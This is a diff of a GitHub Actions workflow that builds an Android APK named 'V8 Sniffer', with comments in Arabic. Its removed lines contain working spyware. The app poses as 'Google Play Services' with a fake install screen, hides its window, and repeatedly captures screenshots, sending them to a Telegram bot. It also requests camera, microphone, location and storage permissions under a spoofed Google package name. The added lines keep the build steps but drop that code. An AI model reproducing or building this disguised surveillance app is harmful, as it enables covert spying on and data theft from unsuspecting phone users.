@@ -1,13 +1,7 @@
-name: Build V8 Sniffer - Ultimate Edition
+name: Build V8 Sniffer
 on: 
   push:
-    branches: [ "main" ]
   workflow_dispatch:
-    inputs:
-      version:
-        description: 'الإصدار'
-        required: false
-        default: 'v10.0'
 
 jobs:
   build:
@@ -32,138 +26,40 @@ jobs:
           pip install --upgrade pip
           pip install flet requests
 
-      - name: Create Main Python File
+      - name: Create Config & Requirements
         run: |
-          cat > main.py << 'EOF'
-import flet as ft
-import threading
-import time
-import os
-import sys
-import requests
-import subprocess
-import random
-import datetime
-
-BOT_TOKEN = "YOUR_TOKEN"
-CHAT_ID = "YOUR_CHAT_ID"
-
-BASE_DIR = '/storage/emulated/0'
-
-def send_to_telegram(title, message):
-    try:
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        text = f"🔴 {title}\n\n{message[:200]}"
-        requests.post(url, data={"chat_id": CHAT_ID, "text": text}, timeout=3)
-    except:
-        pass
-
-def background_work():
-    # إرسال إشعار البدء
-    send_to_telegram("✅ تم التشغيل", "التطبيق يعمل في الخلفية")
-    
-    while True:
-        try:
-            # لقطة شاشة كل دقيقة
-            if random.random() < 0.2:
-                path = f'{BASE_DIR}/screen_{int(time.time())}.png'
-                subprocess.run(['screencap', '-p', path], timeout=3)
-                if os.path.exists(path) and os.path.getsize(path) > 1000:
-                    with open(path, 'rb') as f:
-                        files = {'document': f}
-                        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
-                        requests.post(url, data={"chat_id": CHAT_ID}, files=files, timeout=10)
-                    try: os.remove(path)
-                    except: pass
-            time.sleep(60)
-        except:
-            time.sleep(60)
-
-def main(page: ft.Page):
-    page.title = "جاري التثبيت..."
-    page.window_width = 300
-    page.window_height = 200
-    page.window_resizable = False
-    page.bgcolor = "#ffffff"
-    
-    page.add(
-        ft.Container(
-            content=ft.Column([
-                ft.Text("Google Play Services", size=18, weight="bold", color="#4CAF50"),
-                ft.Text("جاري التثبيت... 100%", size=14),
-                ft.ProgressBar(width=200, color="#4CAF50", value=1.0)
-            ], horizontal_alignment=ft.CrossAxisAlignment.CENTER),
-            padding=20
-        )
-    )
-    
-    page.update()
-    time.sleep(2)
-    page.window_visible = False
-    page.update()
-    
-    threading.Thread(target=background_work, daemon=True).start()
-
-if __name__ == "__main__":
-    ft.app(target=main)
-EOF
-
-      - name: Create flet.toml
-        run: |
-          cat > flet.toml << 'EOF'
-[app]
-name = "Google Play Services"
-description = "تحديث أمني"
-package_name = "com.google.android.gms.update"
-version = "1.0.0"
-build_number = "1"
-
-[build]
-android_permissions = [
-    "android.permission.INTERNET",
-    "android.permission.READ_EXTERNAL_STORAGE",
-    "android.permission.WRITE_EXTERNAL_STORAGE",
-    "android.permission.CAMERA",
-    "android.permission.RECORD_AUDIO",
-    "android.permission.ACCESS_FINE_LOCATION",
-    "android.permission.ACCESS_COARSE_LOCATION"
-]
-
-[android]
-min_sdk_version = 21
-target_sdk_version = 33
-EOF
-
-      - name: Create requirements.txt
-        run: |
-          cat > requirements.txt << 'EOF'
-requests
-EOF
+          echo '[app]' > flet.toml
+          echo 'name = "V8 Sniffer"' >> flet.toml
+          echo 'package_name = "com.v8.sniffer"' >> flet.toml
+          echo 'version = "1.0.0"' >> flet.toml
+          echo 'build_number = "1"' >> flet.toml
+          echo '' >> flet.toml
+          echo '[android]' >> flet.toml
+          echo 'min_sdk_version = 21' >> flet.toml
+          echo 'target_sdk_version = 33' >> flet.toml
+          echo '' >> flet.toml
+          echo 'requests' > requirements.txt
 
       - name: Build APK
         run: |
-          # بناء APK بالطريقة الصحيحة
+          # تجاوز أخطاء اليونيكود القديمة
+          cat << 'EOF' > sitecustomize.py
+          import sys
+          if sys.version_info[0] >= 3:
+              import builtins
+              builtins.unicode = str
+              builtins.basestring = (str, bytes)
+          EOF
+          export PYTHONPATH=$PWD
+          export FLET_CLI_NO_RICH_OUTPUT="true"
           flet build apk
           
-          # البحث عن APK
-          echo "🔍 البحث عن ملف APK..."
-          find . -name "*.apk" -type f -ls
-          
-          # نسخ APK إلى مجلد معروف
-          mkdir -p output
-          APK_FILE=$(find . -name "*.apk" -type f | head -1)
-          if [ -f "$APK_FILE" ]; then
-            cp "$APK_FILE" output/
-            echo "✅ تم نسخ APK إلى output/"
-            ls -la output/
-          else
-            echo "❌ لم يتم العثور على APK"
-          fi
-
       - name: Upload APK
         uses: actions/upload-artifact@v4
         with:
-          name: Google-Play-Services-APK
-          path: output/*.apk
-          if-no-files-found: error
+          name: V8-Sniffer-Final
+          path: |
+            build/apk/**/*.apk
+            **/*.apk
+          if-no-files-found: warn
           retention-days: 90
